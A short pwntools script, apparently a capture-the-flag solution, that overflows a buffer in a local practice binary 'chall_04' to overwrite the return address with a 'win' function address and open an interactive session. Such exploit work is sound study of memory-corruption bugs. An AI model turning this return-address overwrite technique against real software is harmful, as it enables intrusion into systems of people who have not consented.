from pwn import *

win_addy = 0x00401176

p = process("./chall_04")

#ryan rule
offset = 0x60 - 0x8


p.recv()
payload =  cyclic(offset) + p64(win_addy)

p.sendline(payload)
print(p.recv())
p.interactive()